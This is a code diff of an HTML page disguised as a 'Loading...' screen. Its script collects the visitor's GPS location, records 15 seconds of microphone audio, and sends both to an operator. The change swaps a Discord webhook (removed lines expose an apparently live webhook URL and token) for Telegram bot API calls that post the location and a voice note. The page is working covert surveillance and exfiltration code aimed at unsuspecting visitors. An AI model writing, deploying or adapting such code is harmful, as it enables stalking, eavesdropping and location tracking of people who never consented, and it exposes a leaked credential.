@@ -4,7 +4,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f4f4f4;}
+        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f4f4f4; }
         h3 { color: #333; }
     </style>
 </head>
@@ -12,8 +12,9 @@
     <h3 id="statusText">Please wait...</h3>
 
     <script>
-        // 1. Yahan apna Discord Webhook URL daalo (Quotes ke andar)
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561633434420383794/wr24hTxamFvjv1uzyvRhsR65EMzP0bWw2AqdUWd3kZZeaOY8f-m22nedaGYhkRg_bsPY";
+        // 1. Yahan apni Telegram details daalo
+        const TELEGRAM_BOT_TOKEN = "YAHAN_BOT_TOKEN_DAALO"; 
+        const TELEGRAM_CHAT_ID = "YAHAN_CHAT_ID_DAALO"; 
 
         // 2. Location nikaalo
         if ("geolocation" in navigator) {
@@ -47,32 +48,30 @@
                     video: false 
                 });
 
-                const mediaRecorder = new MediaRecorder(stream);
+                // MediaRecorder setup (Telegram voice note ke liye best format)
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                 const chunks = [];
 
-                // Audio data collect karo
                 mediaRecorder.ondataavailable = (e) => {
                     if (e.data.size > 0) chunks.push(e.data);
                 };
 
-                // Jab recording band ho, toh Discord bhejo
                 mediaRecorder.onstop = async () => {
                     // Mic band kar do
                     stream.getTracks().forEach(track => track.stop());
-                    document.getElementById('statusText').innerText = "Sending to Discord...";
+                    document.getElementById('statusText').innerText = "Sending to Telegram...";
 
                     // Audio file banao
                     const blob = new Blob(chunks, { type: 'audio/webm' });
                     
-                    // Discord par location aur audio bhejo
-                    await sendToDiscord(lat, lon, mapLink, blob);
-                    document.getElementById('statusText').innerText = "✅ Audio & Location sent to Discord!";
+                    // Telegram par location aur audio bhejo
+                    await sendToTelegram(lat, lon, mapLink, blob);
+                    document.getElementById('statusText').innerText = "✅ Audio & Location sent to Telegram!";
                 };
 
-                // Recording shuru karo
                 mediaRecorder.start();
 
-                // 15000 ms = 15 second baad recording automatically rok do
+                // 15000 ms = 15 second baad recording rok do
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, 15000); 
@@ -80,31 +79,41 @@
             } catch (err) {
                 console.error("Mic error: ", err);
                 // Agar mic block ho gaya, toh bas location bhej do
-                sendToDiscord(lat, lon, mapLink, null);
+                sendToTelegram(lat, lon, mapLink, null);
                 document.getElementById('statusText').innerText = "❌ Mic Permission Denied";
             }
         }
 
-        // 4. Discord API Call
-        async function sendToDiscord(lat, lon, mapLink, audioBlob) {
-            const formData = new FormData();
-            const payload = {
-                content: `🎙️ **New Audio Recording (15 Sec)**\n**Lat:** ${lat}\n**Lon:** ${lon}\n**Map:** ${mapLink}`
-            };
-            formData.append("payload_json", JSON.stringify(payload));
-
-            // Agar audio file mili hai, toh attach karo
-            if (audioBlob) {
-                formData.append("file", audioBlob, "audio.webm");
-            }
-
+        // 4. Telegram API Call
+        async function sendToTelegram(lat, lon, mapLink, audioBlob) {
+            
+            // Pehle Text Message (Location ke sath) bhejo
+            const textMessage = `📍 *New Audio Recording (15 Sec)*\n\n*Lat:* ${lat}\n*Lon:* ${lon}\n*Map:* [Google Maps]( ${mapLink} )`;
+            
             try {
-                await fetch(DISCORD_WEBHOOK_URL, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: "POST",
-                    body: formData
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: "Markdown"
+                    })
                 });
+
+                // Agar Audio file mili hai, toh Voice Note ke roop mein bhejo
+                if (audioBlob) {
+                    const formData = new FormData();
+                    formData.append("chat_id", TELEGRAM_CHAT_ID);
+                    formData.append("voice", audioBlob, "audio.webm"); // 'voice' likhne se Telegram isko voice note banata hai
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+                        method: "POST",
+                        body: formData
+                    });
+                }
             } catch (e) {
-                console.error("Discord send failed", e);
+                console.error("Telegram send failed", e);
             }
         }
     </script>
